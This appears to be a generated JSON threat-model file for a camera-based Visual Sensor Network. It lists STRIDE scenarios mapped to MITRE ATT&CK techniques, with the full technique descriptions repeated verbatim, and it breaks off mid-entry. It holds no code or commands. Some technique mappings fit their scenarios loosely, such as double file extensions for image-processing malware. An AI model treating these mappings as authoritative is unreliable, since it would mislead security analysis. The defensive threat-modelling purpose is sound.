[
{
    "case_number": "2",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor impersonates a legitimate camera node to gain access to the Visual Sensor Network.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong authentication mechanisms in camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Network lacks strong device authentication features."
                },
                {
                    "Assumption": "Access to network communication medium.",
                    "Role": "Attacker",
                    "Condition": "Attacker can intercept or inject traffic into the network."
                }
            ],
            "Potential Impact": "Unauthorized access to visual data, potential manipulation of data streams.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a malicious domain to redirect communications from legitimate nodes.",
            "Assumptions": [
                {
                    "Assumption": "Use of DNS without adequate security measures.",
                    "Role": "Attacker",
                    "Condition": "DNS queries/responses are not secured."
                },
                {
                    "Assumption": "Availability of a malicious domain name.",
                    "Role": "Attacker",
                    "Condition": "Attacker can register and control a malicious domain."
                }
            ],
            "Potential Impact": "Unauthorized data interception, potential data loss, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "DNS spoofing",
                "domain",
                "network",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker advertises a fake access point to intercept communications from camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Wi-Fi communication between nodes and central server.",
                    "Role": "Attacker",
                    "Condition": "Wireless network used without adequate protection."
                },
                {
                    "Assumption": "Weak or no encryption on the communication.",
                    "Role": "Attacker",
                    "Condition": "Communications can be captured in plain text."
                }
            ],
            "Potential Impact": "Unauthorized data access, potential manipulation of visual data streams.",
            "MITRE ATT&CK Keywords": [
                "rogue access point",
                "Wi-Fi",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates image data sent by camera nodes to the server.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient data integrity checks.",
                    "Role": "Attacker",
                    "Condition": "Data integrity is not verified."
                },
                {
                    "Assumption": "Ability to intercept and modify network traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker can access and alter data in transit."
                }
            ],
            "Potential Impact": "Corruption of visual data, reduced reliability of data.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network",
                "data integrity",
                "image manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware is introduced into the VSN affecting image processing algorithms.",
            "Assumptions": [
                {
                    "Assumption": "No whitelist of allowed software.",
                    "Role": "Attacker",
                    "Condition": "Unverified software can be executed."
                },
                {
                    "Assumption": "Gaps in malware detection mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Existing security measures are outdated or insufficient."
                }
            ],
            "Potential Impact": "Manipulation of visual data processing, unauthorized control over image analysis.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "image processing",
                "software tampering",
                "code injection"
            ],
            "mitre_technique": {
                "name": "Double File Extension",
                "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
                "id": "attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e",
                "technique_id": "T1036.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Firmware updates are intercepted and malicious code is introduced.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure update mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Firmware updates are not cryptographically signed or verified."
                },
                {
                    "Assumption": "Network traffic can be intercepted.",
                    "Role": "Attacker",
                    "Condition": "Network communication channels are not secured."
                }
            ],
            "Potential Impact": "Introduction of vulnerabilities, potential control over devices, data corruption.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "device control",
                "network",
                "secure updates"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious data by exploiting system logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not secured and can be altered.",
                    "Role": "Attacker",
                    "Condition": "Log integrity is not maintained."
                },
                {
                    "Assumption": "Insufficient logging of actions.",
                    "Role": "Attacker",
                    "Condition": "Actions are not adequately logged."
                }
            ],
            "Potential Impact": "Difficulty in incident response, loss of accountability.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "repudiation",
                "data integrity",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User actions within the VSN cannot be traced due to lack of proper auditing.",
            "Assumptions": [
                {
                    "Assumption": "Lack of an audit trail.",
                    "Role": "Attacker",
                    "Condition": "No detailed logs of user actions are maintained."
                },
                {
                    "Assumption": "Insufficient access controls.",
                    "Role": "Attacker",
                    "Condition": "Users have unnecessary privileges."
                }
            ],
            "Potential Impact": "Inability to accurately trace user actions, potential for misuse without detection.",
            "MITRE ATT&CK Keywords": [
                "audit bypass",
                "logging",
                "access control",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits weak authentication to deny sending harmful commands to image nodes.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no user authentication.",
                    "Role": "Attacker",
                    "Condition": "Weak authentication mechanisms are in place."
                },
                {
                    "Assumption": "Commands are not logged or verified.",
                    "Role": "Attacker",
                    "Condition": "Command actions are not logged."
                }
            ],
            "Potential Impact": "Command tampering, loss of traceability.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "authentication",
                "logging",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data intercepted during transmission to central server.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encrypted communication channels.",
                    "Role": "Attacker",
                    "Condition": "Data in transit is unencrypted."
                },
                {
                    "Assumption": "Access to network communication medium.",
                    "Role": "Attacker",
                    "Condition": "Attacker can intercept network traffic."
                }
            ],
            "Potential Impact": "Unwarranted display and access to sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "data in transit",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to stored visual data on the server.",
            "Assumptions": [
                {
                    "Assumption": "Poor access control on stored data.",
                    "Role": "Attacker",
                    "Condition": "Inadequate data protection measures in place."
                },
                {
                    "Assumption": "Server vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities in server software or configuration."
                }
            ],
            "Potential Impact": "Access to stored visual data, potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "unauthorized access",
                "data at rest",
                "data leakage",
                "access control"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of metadata associated with visual data transmission.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is not protected.",
                    "Role": "Attacker",
                    "Condition": "Metadata is transmitted in plaintext."
                },
                {
                    "Assumption": "Access to network communication.",
                    "Role": "Attacker",
                    "Condition": "Ability to intercept network traffic."
                }
            ],
            "Potential Impact": "Leakage of sensitive metadata, potential for profiling and data exploitation.",
            "MITRE ATT&CK Keywords": [
                "metadata exposure",
                "data interception",
                "plaintext transmission",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding network with excessive traffic to disrupt VSN operations.",
            "Assumptions": [
                {
                    "Assumption": "Ability to generate high volume of network traffic.",
                    "Role": "Attacker",
                    "Condition": "Possession of enough resources to create a network flood."
                },
                {
                    "Assumption": "Lack of rate limiting mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Network does not limit traffic rates."
                }
            ],
            "Potential Impact": "Disruption of visual data transmission, service unavailability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flood",
                "service disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of known vulnerabilities to crash camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable software without patches.",
                    "Role": "Attacker",
                    "Condition": "Running unpatched software versions."
                },
                {
                    "Assumption": "Access to exploit codes.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and availability of exploitations."
                }
            ],
            "Potential Impact": "Node unavailability, loss of transmitted visual data.",
            "MITRE ATT&CK Keywords": [
                "software vulnerabilities",
                "exploit",
                "node crash",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion through continuous connections or tasks.",
            "Assumptions": [
                {
                    "Assumption": "No limits on resource usage per connection.",
                    "Role": "Attacker",
                    "Condition": "System does not enforce resource limits."
                },
                {
                    "Assumption": "Ability to establish multiple connections.",
                    "Role": "Attacker",
                    "Condition": "Attacker can initiate and maintain multiple connections."
                }
            ],
            "Potential Impact": "Exhaustion of resources, reduced system performance, potential crashes.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "multiple connections",
                "performance degradation",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
